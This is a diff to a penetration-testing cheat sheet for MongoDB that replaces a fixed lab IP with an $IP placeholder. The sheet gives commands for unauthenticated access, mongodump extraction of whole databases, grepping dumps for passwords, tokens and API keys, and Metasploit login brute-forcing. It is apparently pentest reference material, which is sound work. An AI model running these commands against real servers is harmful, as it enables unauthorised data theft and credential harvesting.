@@ -1,15 +1,15 @@
 # MongoDB (27017)
 
 !!! tip "Start here"
-    Connect without credentials: `mongosh --host 10.10.10.10` (or legacy `mongo --host 10.10.10.10`). MongoDB before 3.6 bound to `0.0.0.0` by default with no authentication, unauthenticated access is still extremely common on internal deployments and exposed cloud instances.
+    Connect without credentials: `mongosh --host $IP` (or legacy `mongo --host $IP`). MongoDB before 3.6 bound to `0.0.0.0` by default with no authentication, unauthenticated access is still extremely common on internal deployments and exposed cloud instances.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -p 27017 -sV --script mongodb-info,mongodb-databases 10.10.10.10
-mongosh --host 10.10.10.10 --eval "db.version()"
+nmap -p 27017 -sV --script mongodb-info,mongodb-databases $IP
+mongosh --host $IP --eval "db.version()"
 ```
 
 ---
@@ -17,7 +17,7 @@ mongosh --host 10.10.10.10 --eval "db.version()"
 ## Unauthenticated Access
 
 ```bash
-mongosh --host 10.10.10.10
+mongosh --host $IP
 ```
 
 Once connected:
@@ -36,7 +36,7 @@ db.getUsers()                         // list MongoDB users
 ## Authenticated Access
 
 ```bash
-mongosh --host 10.10.10.10 -u <user> -p <pass> --authenticationDatabase admin
+mongosh --host $IP -u <user> -p <pass> --authenticationDatabase admin
 ```
 
 ---
@@ -44,14 +44,14 @@ mongosh --host 10.10.10.10 -u <user> -p <pass> --authenticationDatabase admin
 ## Dumping Databases
 
 ```bash
-mongodump --host 10.10.10.10 --out ./mongo_dump
-mongodump --host 10.10.10.10 -d <database> -c <collection> --out ./mongo_dump
+mongodump --host $IP --out ./mongo_dump
+mongodump --host $IP -d <database> -c <collection> --out ./mongo_dump
 ```
 
 Dump with authentication:
 
 ```bash
-mongodump --host 10.10.10.10 -u <user> -p <pass> --authenticationDatabase admin --out ./mongo_dump
+mongodump --host $IP -u <user> -p <pass> --authenticationDatabase admin --out ./mongo_dump
 ```
 
 ---
@@ -70,7 +70,7 @@ db.getCollectionNames().forEach(function(c) {
 Dump everything and grep offline, faster than querying interactively:
 
 ```bash
-mongodump --host 10.10.10.10 --out ./mongo_dump
+mongodump --host $IP --out ./mongo_dump
 grep -riE 'password|token|api[_-]?key|secret' ./mongo_dump
 ```
 
@@ -80,7 +80,7 @@ grep -riE 'password|token|api[_-]?key|secret' ./mongo_dump
 
 ```bash
 use auxiliary/scanner/mongodb/mongodb_login
-set RHOSTS 10.10.10.10
+set RHOSTS $IP
 run
 ```
 
